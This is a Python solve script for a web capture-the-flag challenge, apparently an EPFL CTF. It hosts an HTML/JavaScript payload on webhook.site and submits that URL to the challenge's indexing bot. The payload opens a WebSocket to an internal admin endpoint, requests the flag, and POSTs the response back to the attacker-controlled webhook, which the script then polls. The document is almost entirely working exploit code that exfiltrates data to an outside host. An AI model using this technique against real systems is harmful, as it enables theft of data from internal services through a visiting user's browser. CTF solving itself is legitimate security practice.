#!/usr/bin/env python3
import requests
import sys
from time import sleep

if len(sys.argv) != 2:
  print("Usage: python3 solve.py http://chall-url:port")
  sys.exit(1)

CHALL_URL = sys.argv[1]

PAYLOAD = """<!DOCTYPE html>
<html>
    <body>
        <script>
            try {
                var ws = new WebSocket("ws://web:8080/admin/ws");
                ws.onmessage = function(event) {
                    fetch(location.href + "/flag", {
                        method: "POST",
                        body: event.data
                    });
                };
                ws.onopen = function(event) {
                    ws.send("flag");
                };
            } catch (error) {
                fetch(location.href + "/error", {
                    method: "POST",
                    body: error.toString()
                });
            }
        </script>
    </body>
</html>"""

r = requests.post('https://webhook.site/token', json={
  "default_status": 200,
  "default_content": PAYLOAD,
  "default_content_type": "text/html",
})

uuid = r.json()['uuid']
WEBHOOK_URL = 'http://webhook.site/' + uuid
print('URL Created:', WEBHOOK_URL)

r = requests.post(CHALL_URL + '/submit', data={
  'url': WEBHOOK_URL
})
assert 'a librarian will index your document shortly' in r.text, "Error submitting document"
print("Submitted document")

for i in range(10):
  r = requests.get(f'https://webhook.site/token/{uuid}/request/latest/raw')
  if r.status_code == 200:
    print(r.text)
  if 'EPFL{' in r.text:
    break
  sleep(1)

requests.delete(f'https://webhook.site/token/{uuid}')
